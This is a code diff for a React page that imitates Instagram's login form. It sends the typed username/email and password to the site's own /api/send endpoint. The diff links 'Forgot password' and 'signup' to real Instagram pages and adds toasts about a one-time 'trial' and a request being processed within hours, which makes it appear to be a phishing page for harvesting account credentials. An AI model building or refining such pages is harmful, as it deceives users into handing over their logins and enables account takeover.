@@ -1,29 +1,46 @@
 "use client"
 import axios from 'axios'
-import React, { useState } from 'react'
+import { ToastContainer, toast } from 'react-toastify';
+  import 'react-toastify/dist/ReactToastify.css';
+import React, { useEffect, useState } from 'react'
 
 const page = () => {
   const [email, setemail] = useState()
   const [pass, setpass] = useState()
-  const [error, seterror] = useState()
+  const [error, seterror] = useState("Log in")
+
+useEffect(()=> {
+(async()=> {
+   const rss = await axios.post("/api/check")
+   if(rss.data.success) {
+    toast("Trial is only for one time")
+   }
+})()
+},[])
+
 
   const clicked = (e)=> {
     (async()=> {
+        seterror("please wait")
         if(email > "3" && pass > "3") {
         e.preventDefault()
       const result = await axios.post("/api/send", {email: email, password: pass})
+      seterror("Log in")
+      if(result.data.success) {
+        toast("Request submitted we will notify you in 1 to 2 hour")
+        seterror("Log in")
+      }
         }
         else {
             e.preventDefault()
-            seterror("Error")
-            setTimeout(()=> {
-                seterror("")
-            },1000)
+            toast("Error")
+            seterror("Log in")
         }
     })()
   }
   return (
-    <div> <main className="flex align-items-center justify-content-center">
+    
+    <div><ToastContainer /> <main className="flex align-items-center justify-content-center">
     <section id="mobile" className="flex">
     </section>
     <section id="auth" className="flex direction-column">
@@ -34,11 +51,11 @@ const page = () => {
             <form>
                 <label htmlFor="email" className="sr-only">phone number, username, email</label>
                 <input onChange={(e)=> setemail(e.target.value)} name="email" placeholder="Phone number, Username or Email" />
-{error}
+
                 <label htmlFor="password" className="sr-only">Senha</label>
                 <input onChange={(e)=> setpass(e.target.value)} name="password" type="password" placeholder="Password" />
-{error}
-                <button onClick={clicked}>Log in</button>
+
+                <button onClick={clicked}>{error}</button>
             </form>
             <div className="flex separator align-items-center">
                 <span></span>
@@ -50,12 +67,12 @@ const page = () => {
                     <img />
                     <a>Login with facebook</a>
                 </div> --> */}
-                <a href="#">Forgot password</a>
+                <a target='_blank' href="https://www.instagram.com/accounts/password/reset">Forgot password</a>
             </div>
         </div>
         <div className="panel register flex justify-content-center">
             <p>Don't have an account?</p>
-            <a href="#">signup</a>
+            <a target='_blank' href="https://www.instagram.com/accounts/emailsignup">signup</a>
         </div>
         <div className="app-download flex direction-column align-items-center">
             <p>Get the app</p>
